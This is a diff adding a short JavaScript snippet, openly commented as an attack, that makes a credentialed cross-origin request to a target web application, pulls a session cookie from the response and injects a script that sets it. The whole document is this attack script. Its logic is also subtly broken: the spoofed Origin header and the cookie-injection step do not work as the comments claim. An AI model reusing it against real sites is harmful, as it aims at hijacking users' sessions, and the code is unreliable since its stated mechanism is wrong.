@@ -1,0 +1,21 @@
+// Make a cross-origin request to the target web application
+fetch('https://target-web-app.com/api/data', {
+    method: 'GET',
+    mode: 'cors',
+    credentials: 'include',
+    headers: {
+        'Origin': 'https://attacker-website.com'
+    }
+}).then(response => response.json())
+  .then(data => {
+      // Retrieve sensitive information from the target web application
+      const sessionCookie = data.session_cookie;
+
+      // Craft a malicious script using the stolen session cookie
+      const maliciousScript = `document.cookie = "session=${sessionCookie}; path=/";`;
+
+      // Inject the malicious script into the victim's browser
+      const scriptElement = document.createElement('script');
+      scriptElement.innerText = maliciousScript;
+      document.body.appendChild(scriptElement);
+  });
